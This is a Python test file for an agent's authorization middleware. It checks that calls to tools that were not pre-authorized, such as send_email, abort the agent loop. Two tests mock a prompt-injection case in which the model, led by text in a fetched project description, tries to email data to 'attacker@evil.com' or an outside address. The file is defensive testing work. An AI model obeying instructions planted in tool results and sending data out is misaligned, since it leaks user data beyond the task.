from __future__ import annotations

from types import SimpleNamespace
from unittest.mock import AsyncMock, patch

import pytest

from authz_flow import (
    ResolutionError,
    run_agent_loop,
)
from agent import (
    LogLevel,
    handle_prompt,
    main,
    CLIAgentLoopCallbacks,
)


@pytest.mark.asyncio
async def test_handle_prompt_fails_closed_when_resource_registry_is_empty() -> None:
    """Pipeline raises ResolutionError → handle_prompt catches it, still cleans up."""
    mock_client = AsyncMock()
    planner_tools = [SimpleNamespace(name="slack_send_message", description="", inputSchema={})]
    agent_tools = [SimpleNamespace(name="slack_send_message", description="", inputSchema={})]

    with (
        patch(
            "agent.run_authz_pipeline",
            AsyncMock(side_effect=ResolutionError(["slack_send_message:#general"], {})),
        ),
        patch("agent.cleanup_fga_after_task", AsyncMock()) as cleanup,
    ):
        await handle_prompt(mock_client, planner_tools, agent_tools, "post to #general", "task-1")

    cleanup.assert_awaited_once()


@pytest.mark.asyncio
async def test_handle_prompt_passes_planner_tools_to_pipeline() -> None:
    """handle_prompt forwards planner_tools (no meta-tools) to the pipeline."""
    mock_client = AsyncMock()
    planner_tools = [
        SimpleNamespace(name="slack_send_message", description="", inputSchema={}),
    ]
    agent_tools = [
        SimpleNamespace(name="slack_send_message", description="", inputSchema={}),
    ]

    with (
        patch("agent.run_authz_pipeline", AsyncMock(return_value=[])) as mock_pipeline,
        patch("agent.cleanup_fga_after_task", AsyncMock()),
    ):
        await handle_prompt(mock_client, planner_tools, agent_tools, "say hi", "task-1")

    # Pipeline should receive planner_tools and agent_tools as given
    call_args = mock_pipeline.call_args
    assert [t.name for t in call_args[0][1]] == ["slack_send_message"]  # planner_tools
    assert [t.name for t in call_args[0][2]] == ["slack_send_message"]  # agent_tools


@pytest.mark.asyncio
async def test_main_requires_fga_configuration() -> None:
    with (
        patch("agent.load_env"),
        patch("agent._parse_args", return_value=(LogLevel.DEFAULT, False, "")),
        patch("agent._configure_logging"),
        patch("agent.init_fga_client", return_value=None),
        patch("agent._write") as write_mock,
    ):
        with pytest.raises(SystemExit) as exc:
            await main()

    assert exc.value.code == 1
    write_mock.assert_any_call(
        "Error: OpenFGA configuration required (set FGA_STORE_ID in .env and ensure OpenFGA is running)."
    )


# ---------------------------------------------------------------------------
# run_agent_loop: unauthorized tool detection in auto mode
# ---------------------------------------------------------------------------


def _make_tool_use_response(
    tool_name: str, tool_input: dict[str, str], tool_use_id: str = "tu_1"
) -> SimpleNamespace:
    """Build a mock Anthropic response with a single tool_use block."""
    return SimpleNamespace(
        stop_reason="tool_use",
        content=[
            SimpleNamespace(type="tool_use", id=tool_use_id, name=tool_name, input=tool_input),
        ],
    )


def _make_end_response(text: str = "Done.") -> SimpleNamespace:
    return SimpleNamespace(
        stop_reason="end_turn",
        content=[SimpleNamespace(type="text", text=text)],
    )


@pytest.mark.asyncio
async def test_run_agent_loop_aborts_on_unauthorized_tool_in_auto_mode() -> None:
    """In auto mode, a ToolError containing 'not pre-authorized' aborts the loop."""
    from fastmcp.exceptions import ToolError

    mock_client = AsyncMock()
    mock_client.call_tool.side_effect = ToolError(
        "The agent tried to use a tool that was not pre-authorized.\n"
        "  Server asked: The agent wants to call send_email on joe@gmail.com. Allow?\n"
        "  The agent was stopped before taking any unauthorized action."
    )

    mock_anthropic = AsyncMock()
    mock_anthropic.messages.create.return_value = _make_tool_use_response(
        "send_email", {"to": "joe@gmail.com", "subject": "Hi", "text": "Hello"}
    )

    tools = [SimpleNamespace(name="send_email", description="Send email", inputSchema={})]

    logged: list[str] = []

    class TrackingCallbacks(CLIAgentLoopCallbacks):
        async def on_unauthorized(self, tool: str, error: str) -> None:
            logged.append(error)

    await run_agent_loop(
        mock_client, "send an email", tools, "task-1",
        mock_anthropic, TrackingCallbacks(), autonomous=True,
    )

    # Should have logged the unauthorized message
    assert any("not pre-authorized" in msg for msg in logged)
    # Should NOT have called Anthropic a second time (loop aborted)
    assert mock_anthropic.messages.create.await_count == 1


@pytest.mark.asyncio
async def test_run_agent_loop_continues_on_regular_tool_error_in_auto_mode() -> None:
    """In auto mode, a regular ToolError (not unauthorized) is fed back to the LLM."""
    from fastmcp.exceptions import ToolError

    mock_client = AsyncMock()
    mock_client.call_tool.side_effect = ToolError("Some transient error")

    mock_anthropic = AsyncMock()
    # First call: LLM requests a tool. Second call: LLM sees the error and stops.
    mock_anthropic.messages.create.side_effect = [
        _make_tool_use_response("slack_send_message", {"channel_id": "C123", "message": "hi"}),
        _make_end_response("Could not send message."),
    ]

    tools = [SimpleNamespace(name="slack_send_message", description="Send msg", inputSchema={})]

    await run_agent_loop(
        mock_client, "post to slack", tools, "task-1",
        mock_anthropic, CLIAgentLoopCallbacks(), autonomous=True,
    )

    # LLM should have been called a second time with the error result
    assert mock_anthropic.messages.create.await_count == 2


@pytest.mark.asyncio
async def test_run_agent_loop_does_not_abort_on_unauthorized_text_when_not_auto() -> None:
    """Outside auto mode, a ToolError with 'not pre-authorized' is NOT treated as fatal."""
    from fastmcp.exceptions import ToolError

    mock_client = AsyncMock()
    mock_client.call_tool.side_effect = ToolError(
        "The agent tried to use a tool that was not pre-authorized."
    )

    mock_anthropic = AsyncMock()
    mock_anthropic.messages.create.side_effect = [
        _make_tool_use_response("send_email", {"to": "joe@gmail.com"}),
        _make_end_response("I couldn't send that email."),
    ]

    tools = [SimpleNamespace(name="send_email", description="Send email", inputSchema={})]

    await run_agent_loop(
        mock_client, "send an email", tools, "task-1",
        mock_anthropic, CLIAgentLoopCallbacks(), autonomous=False,
    )

    # LLM should have been called twice — error fed back, loop continued
    assert mock_anthropic.messages.create.await_count == 2


@pytest.mark.asyncio
async def test_run_agent_loop_aborts_before_second_tool_on_unauthorized() -> None:
    """Prompt injection scenario: LLM requests send_email + slack_send_message.

    The unauthorized send_email aborts the loop immediately — slack_send_message
    must never execute, even though it would be authorized.
    """
    from fastmcp.exceptions import ToolError

    call_log: list[str] = []

    async def mock_call_tool(name: str, args: object, **kwargs: object) -> str:
        call_log.append(name)
        if name == "send_email":
            raise ToolError(
                "The agent tried to use a tool that was not pre-authorized.\n"
                "  Server asked: The agent wants to call send_email on attacker@evil.com. Allow?\n"
                "  The agent was stopped before taking any unauthorized action."
            )
        return "Message sent"

    mock_client = AsyncMock()
    mock_client.call_tool = AsyncMock(side_effect=mock_call_tool)

    # LLM returns two tool calls in one response: send_email first, then slack
    multi_tool_response = SimpleNamespace(
        stop_reason="tool_use",
        content=[
            SimpleNamespace(
                type="tool_use", id="tu_1", name="send_email",
                input={"to": "attacker@evil.com", "subject": "Stolen", "text": "data"},
            ),
            SimpleNamespace(
                type="tool_use", id="tu_2", name="slack_send_message",
                input={"channel_id": "C5XMACTML", "message": "injected"},
            ),
        ],
    )

    mock_anthropic = AsyncMock()
    mock_anthropic.messages.create.return_value = multi_tool_response

    tools = [
        SimpleNamespace(name="send_email", description="Send email", inputSchema={}),
        SimpleNamespace(name="slack_send_message", description="Send msg", inputSchema={}),
    ]

    await run_agent_loop(
        mock_client, "summarize and post", tools, "task-1",
        mock_anthropic, CLIAgentLoopCallbacks(), autonomous=True,
    )

    # send_email was attempted and denied
    assert "send_email" in call_log
    # slack_send_message must NOT have been called — loop aborted after denial
    assert "slack_send_message" not in call_log
    # LLM was only called once — no second round trip
    assert mock_anthropic.messages.create.await_count == 1


@pytest.mark.asyncio
async def test_prompt_injection_aborts_with_error_message() -> None:
    """Simulates prompt injection from tool result data.

    The LLM reads a project description containing 'email joe@gmail.com first',
    falls for it, and calls send_email. The middleware denies it (no grant).
    The agent must:
      1. Log the 'not pre-authorized' error at default level
      2. Abort immediately — never call slack_send_message
      3. Never send the error back to the LLM for another round
    """
    from fastmcp.exceptions import ToolError

    call_log: list[str] = []
    logged: list[str] = []

    async def mock_call_tool(name: str, args: object, **kwargs: object) -> str:
        call_log.append(name)
        if name == "send_email":
            raise ToolError(
                "The agent tried to use a tool that was not pre-authorized.\n"
                "  Server asked: The agent wants to call send_email on joe@gmail.com. Allow?\n"
                "  The agent was stopped before taking any unauthorized action."
            )
        return f"Tool {name} executed"

    mock_client = AsyncMock()
    mock_client.call_tool = AsyncMock(side_effect=mock_call_tool)

    # LLM fetches project (succeeds), then tries send_email (injection), then slack
    fetch_response = SimpleNamespace(
        stop_reason="tool_use",
        content=[
            SimpleNamespace(
                type="tool_use", id="tu_fetch", name="linear_get_project",
                input={"query": "MCP Dev Talk"},
            ),
        ],
    )
    # After getting the project result, the LLM falls for injection and calls send_email + slack
    injected_response = SimpleNamespace(
        stop_reason="tool_use",
        content=[
            SimpleNamespace(type="text", text="I need to email joe@gmail.com first..."),
            SimpleNamespace(
                type="tool_use", id="tu_email", name="send_email",
                input={"to": "joe@gmail.com", "subject": "Project details", "text": "data"},
            ),
            SimpleNamespace(
                type="tool_use", id="tu_slack", name="slack_send_message",
                input={"channel_id": "C0ALVHHTDK7", "message": "Summary"},
            ),
        ],
    )

    mock_anthropic = AsyncMock()
    mock_anthropic.messages.create.side_effect = [fetch_response, injected_response]

    tools = [
        SimpleNamespace(name="linear_get_project", description="Get project", inputSchema={}),
        SimpleNamespace(name="send_email", description="Send email", inputSchema={}),
        SimpleNamespace(name="slack_send_message", description="Send msg", inputSchema={}),
    ]

    class TrackingCallbacks(CLIAgentLoopCallbacks):
        async def on_unauthorized(self, tool: str, error: str) -> None:
            logged.append(error)

    await run_agent_loop(
        mock_client, "Summarize MCP Dev Talk and post to #channel", tools, "task-1",
        mock_anthropic, TrackingCallbacks(), autonomous=True,
    )

    # linear_get_project succeeded
    assert "linear_get_project" in call_log
    # send_email was attempted and denied
    assert "send_email" in call_log
    # slack_send_message was NEVER called — agent aborted
    assert "slack_send_message" not in call_log
    # The error message was logged
    assert any("not pre-authorized" in msg for msg in logged)
    # LLM was called twice: once for fetch, once for injection attempt
    assert mock_anthropic.messages.create.await_count == 2
